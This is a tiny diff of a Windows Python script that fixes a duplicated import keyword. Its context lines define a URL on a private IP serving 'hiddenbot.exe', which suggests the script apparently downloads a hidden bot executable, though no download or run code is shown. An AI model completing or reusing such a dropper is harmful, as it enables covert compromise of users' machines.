@@ -4,7 +4,7 @@ import win32api
 import win32con
 
 from win32com.shell import shellcon
-from win32com.shell.shell import import SHGetFolderPath
+from win32com.shell.shell import SHGetFolderPath
 
 global chatboturl
 CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
